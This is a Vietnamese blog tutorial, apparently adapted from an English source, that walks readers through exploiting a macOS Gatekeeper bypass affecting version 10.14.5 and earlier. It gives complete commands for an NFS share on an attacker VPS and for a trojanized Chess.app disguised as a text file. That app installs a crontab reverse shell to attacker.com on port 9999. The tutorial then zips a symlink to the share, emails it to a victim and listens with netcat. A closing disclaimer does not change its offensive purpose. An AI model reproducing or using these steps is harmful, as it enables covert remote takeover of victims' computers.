Mấy ngày nay trên mạng có rộ lên về một cách hack vào macOS bằng file zip. Qua quá trình tìm hiểu thì trong bài viết này mình sẽ hướng dẫn các bạn từng bước để có thể thực hiện khai thác được lỗ hổng này.

Phần mềm bảo mật Gatekeeper của Apple cho macOS (Mac OS X) được phát hiện chứa một lỗ hổng bảo mật trên macOS phiên bản 10.14.5. Hacker ở bất cứ nơi nào trên thế giới có thể khai thác MacBook và các máy tính Mac khác bằng cách chia sẻ một tệp ZIP với nạn nhân.

Lỗ hổng này được phát hiện bởi Filippo Cavallarin, một nhà nghiên cứu bảo mật và hiện đang là CEO của We Are Segment, một công ty an ninh mạng của Ý. Trong bài đăng trên blog của mình, Filippo cũng có hướng dẫn cách khai thác lỗi này. Mình sẽ để video của Filippo ở cuối bài viết để mọi người tiện theo dõi.

Tại thời điểm mình đang ngồi viết bài này thì vẫn chưa thấy có bản vá cho lỗ hổng. Nó ảnh hưởng đến macOS Mojave 10.14.5 và tất cả các phiên bản trước theo Filippo, vì vậy High Sierra, Sierra, El Capitan, Yosemite, v.v ... có khả năng cao là cũng sẽ tồn tại lỗi này.

Okay, bây giờ mình sẽ hướng dẫn chi tiết từng bước một để bạn có thể tự tay khai thác được lỗi bảo mật này, tuy nhiên trước hết chúng ta cần nắm rõ một số khái niệm sau :

-   **Gatekeeper**: Đây là một tính năng bảo mật của macOS được thiết kế để đảm bảo rằng chỉ các ứng dụng đáng tin cậy được phép chạy trên máy tính Mac. Thông thường, khi một ứng dụng được tải xuống thông qua trình duyệt web, Gatekeeper sẽ xác nhận phần mềm từ nhà phát triển đã được xác minh hoặc ngay lập tức đánh dấu nó là "nguy hiểm". Tất nhiên là lỗi bảo mật sắp được nói tới đây hiện không bị GateKeeper chặn.
-   **Symbolic Links** : Symbolic Link được dịch sang tiếng Việt là liên kết tượng trưng. Liên kết tượng trưng là đối tượng hệ thống tập tin trỏ đến đối tượng hệ thống tập tin khác, được xem như là đường tắt nâng cao (advanced shorcut). Symlink có thể trỏ tới một file hoặc một đường dẫn ở máy remote. Trong macOS, các liên kết tượng trưng đến các máy chủ từ xa sẽ được Gatekeeper **tự động tin cậy.**
-   **Network File System** : Một giao thức hệ thống tệp phân tán tương tự SMB. Symlink sẽ thực hiện một kết nối đến (NFS) trên máy của hacker đang chứa file payload.app để khai thác mà hacker đã tạo trước.

Trong bài viết này mình sẽ sử dụng một file txt giả mạo để test. Tuy nhiên thì file payload có thể hóa thân thành bất cứ file nào như PDF hay MP4,... Việc sau đó là đổi icon và đuôi của tệp.

![](https://anonymousvn.org/wp-content/uploads/2019/05/payload-gatekeeper.jpg)

Nhìn vào đây rất khó có thể biết được file nào là file độc hại

Một NSF share server sẽ được cài đặt trên VPS chạy Debian 9. Hai file được tạo là : payload.app và exploit.zip.

-   File payload.app là file hacker dự định sẽ cài lên máy của victim, file này sẽ chạy một số command và crontab
-   File exploit.zip cũng là file dự định tải xuống máy của victim, file này chứa symlink dùng để bypass Gatekeeper.

Server sẽ được cấu hình Netcat để nhận các reverse shell. Tệp exploit.zip sẽ được chia sẻ với victim qua email.

Bước 1: Cài đặt NFS trên VPS Debian 9
-------------------------------------

Okay, chúng ta sẽ cần SSH vào vps. Thật ra bạn cũng có thể setup trên local, tuy nhiên với mục đích là có thể hack Macbook ở bất cứ nơi nào nên mình sẽ cài đặt nó lên 1 con VPS. Tiến hành gõ lệnh sau để cài đặt các package cần thiết:

`sudo apt-get install nfs-common nfs-kernel-server`

Sau khi cài xong thì NFS sẽ được khởi động, bạn cũng có thể check bằng lệnh sau:

`sudo systemctl status nfs-server`

Mình sẽ tạo một folder mới để chứa file payload.app.

`sudo mkdir -p /nfs/monthly`

Folder này sẽ được chia sẻ để máy tính nạn nhân dễ dàng truy cập được từ xa.

`sudo echo '/nfs/monthly *(insecure,rw,no_root_squash,anonuid=1000,anongid=1000,async,nohide)' >> /etc/exports`

Khởi động lại NFS server

`sudo systemctl restart nfs-server`

Bạn cũng có thể kiểm tra xem folder đã được chia sẻ chưa bằng cách gõ lệnh sau. Nếu kết quả hiện như dưới là đã thành công.

`~$ showmount -e <vps ip address>`

`Export list for <vps ip address>:`

`/nfs/monthly *`

Bước 2: Tạo file payload.app
----------------------------

Để tạo được payload này thì bạn cần sử dụng một Macbook, mở Terminal lên và gõ như sau để chuyển sang superuser:

`~$ sudo su`


Đặt biến $app để tiện theo dõi và sử dụng làm tên của file text chúng ta sẽ fake.

`~``# app='payload_name'`

Sao chép game cờ vào folder /tmp . Trong bài viết của tác giả thì tác giả có sử dụng với ứng dụng Calculator tuy nhiên không hiểu vì lí do gì mình không chạy được trên máy mình, thay vào đó mình sử dụng game Chess.

`~``# cp -r /Applications/Chess.app/ /tmp/"$app".app`

Giờ là lúc bạn copy các payload vào file:

`~``# printf '#!/bin/bash\n%s' "echo '* * * * *     bash -i >&amp; /dev/tcp/attacker.com/9999 0>&amp;1' | crontab -" >/tmp/"$app".app/Contents/MacOS/Chess`

Lệnh printf sẽ dẫn (|) một Bash one-liner vào lệnh crontab. Bash one-liner sẽ được lên lịch để thực hiện kết nối TCP mỗi 60 giây một lần tới cổng 9999 của attacker.com

Chmod để app có quyền chạy.

`~``# chmod +x /tmp/"$app".app/Contents/MacOS/Chess`

Thay icon cho ứng dụng Chess bằng lệnh bên dưới. Bạn có thể thay bất cứ icon nào miễn là nó có đuôi .icns

`~``# cp /path/to/text_file.icns /tmp/"$app".app/Contents/Resources/Chess.icns`

Tiến hành nén file payload lại thành một file ZIP

`~``# zip -ry /tmp/"$app".zip /tmp/"$app".app/`

![](https://anonymousvn.org/wp-content/uploads/2019/05/create-payload.app_.jpg)

Sau khi nén file xong thì mình sẽ tiến hành copy file vừa nén lên VPS được tạo ở trên. ( Giả sử IP của VPS là 11.22.33.44)

`~``# scp -P 22 /tmp/"$app".zip 11.22.33.44:/nfs/monthly`

`root@attacker.com's password:`

`May.zip                                               100% 4007KB 284.6KB``/s`   `00:14`

Lúc này bạn có thể thấy file May.zip trên VPS

`~$` `ls` `-la` `/nfs/monthly/`

`total 4016`

`drwxr-xr-x 2 root root    4096 May 26 22:38 .`

`drwxr-xr-x 3 root root    4096 May 26 22:17 ..`

`-rw-r--r-- 1 root root 4103220 May 26 22:39 May.zip`

Bây giờ truy cập vào folder /nfs/monthly và tiến hành giải nén file May.zip vừa được upload lên

`/nfs/monthly``# unzip May.zip`

`Archive:  May.zip`

`creating: tmp``/May``.app/`

`creating: tmp``/May``.app``/Contents/`

`creating: tmp``/May``.app``/Contents/_CodeSignature/`

`inflating: tmp``/May``.app``/Contents/_CodeSignature/CodeResources`

`creating: tmp``/May``.app``/Contents/MacOS/`

`inflating: tmp``/May``.app``/Contents/MacOS/Chess`

`creating: tmp``/May``.app``/Contents/Resources/`

`...`

`inflating: tmp``/May``.app``/Contents/Resources/ca``.lproj``/InfoPlist``.``strings`

`inflating: tmp``/May``.app``/Contents/Resources/ca``.lproj``/COPYING`

`inflating: tmp``/May``.app``/Contents/Resources/ca``.lproj``/About``.``strings`

`inflating: tmp``/May``.app``/Contents/Resources/ca``.lproj``/Board``.``strings`

`inflating: tmp``/May``.app``/Contents/Resources/Game``.icns`

`inflating: tmp``/May``.app``/Contents/Info``.plist`

`extracting: tmp``/May``.app``/Contents/PkgInfo`

`inflating: tmp``/May``.app``/Contents/version``.plist`

Chuyển file May.app về folder bạn đang làm việc
`/nfs/monthly``# mv tmp/May.app/ .`

Tiến hành xóa các file, folder không còn cần thiết
`/nfs/monthly``# rm -rf tmp/ &amp;&amp; rm May.zip`

Lúc này trong $app.app chỉ còn lại file May.app

`/nfs/monthly``# ls -la`

`total 12`

`drwxr-xr-x 3 root root 4096 May 26 22:53 .`

`drwxr-xr-x 3 root root 4096 May 26 22:17 ..`

`drwxr-xr-x 3 root root 4096 May 26 22:23 May.app`

Bước 3 : Tạo file exploit.zip
-----------------------------

File exploit.zip như mình đã nói ở trên, sẽ chứa symlink gọi tới NSF share server vừa được setup ở trên. Gõ lệnh sau trên máy Macbook:

`~$` `mkdir` `monthly`


Tạo một symlink tên invoices trong folder monthly

`~$` `ln` `-s` `/net/attacker``.com``/nfs/monthly` `monthly``/invoices`


Nén những gì vừa được tạo ra thành file exploit.zip . Đây là file sẽ được gửi cho user.

`~$ zip -r -y archive.zip monthly`

Lưu ý :

-   -r sẽ giúp bạn nén đệ quy hết tất cả các file trong các folder
-   -y sẽ giúp bạn giữ cấu trúc của symlink khi giải nén

Bước 4 : Gửi file exploit.zip cho nạn nhân
------------------------------------------

![](https://anonymousvn.org/wp-content/uploads/2019/05/send-exploit.zip-to-user.jpg)

Sau khi gửi xong, tất cả những gì bạn cần làm là đợi user mở file May.app.

Ở VPS bạn gõ lệnh sau để lắng nghe các kết nối tới port 9999

`nc` `-l -p 9999`

Chúc bạn thành công <3

Lưu ý : Bài viết mang tính chất tham khảo, không áp dụng với mục đích phá hoại. Bạn phải chịu mọi trách nhiệm về những gì bạn làm.
Nguồn : https://anonymousvn.org/huong-dan-bypass-gatekeeper-va-khai-thac-lo-hong-macos-tren-phien-ban-10-14-5-va-thap-hon.hav
Nguồn tiếng Anh  : <https://null-byte.wonderhowto.com/how-to/bypass-gatekeeper-exploit-macos-v10-14-5-earlier-0198089/>

Video của tác giả : <https://ouo.io/gxjB8vS>